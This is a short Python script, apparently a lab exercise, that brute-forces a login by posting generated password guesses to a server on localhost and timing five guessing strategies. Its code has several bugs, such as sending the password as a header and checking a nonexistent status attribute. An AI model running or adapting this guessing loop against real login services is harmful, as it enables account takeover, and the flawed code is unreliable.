from brute_force_implementation import bruteforce
from time import time
import requests


HOST_URL = ""
def send_password(password_list:list):
    for i in password_list:
        try:
          url = "http://localhost:8000/"
          payload = {"password":str(i)}
          response = requests.post(url,headers=payload)
          response.raise_for_status()  # Raise an exception for unsuccessful requests

          # Access data if successful
          print(response.text)
        except requests.exceptions.RequestException as e:
          print(f"An error occurred: {e}")
        if(response.status):
          print("Password:" + i)
          return True, i     
    return False, ""
        
def brute_force_attack():
  start = time()
  # First case
  password_list = bruteforce()
  result, password = send_password(password_list)
  if (result):
    end = time()
    print('Total time: %.2f seconds' % (end - start))  
  # Second case
  password_list = bruteforce("common_name")
  result, password = send_password(password_list)
  if (result):
    end = time()
    print('Total time: %.2f seconds' % (end - start))  
  # Third case
  password_list = bruteforce("digit")
  result, password = send_password(password_list)
  if (result):
    end = time()
    print('Total time: %.2f seconds' % (end - start))  
  # Forth case
  password_list = bruteforce("digitAndLowercase")
  result, password = send_password(password_list)
  if (result):
    end = time()
    print('Total time: %.2f seconds' % (end - start))  
  # Fifth case
  password_list = bruteforce("fullCase")
  result, password = send_password(password_list)
  if (result):
    end = time()
    print('Total time: %.2f seconds' % (end - start))  
    
  return password
  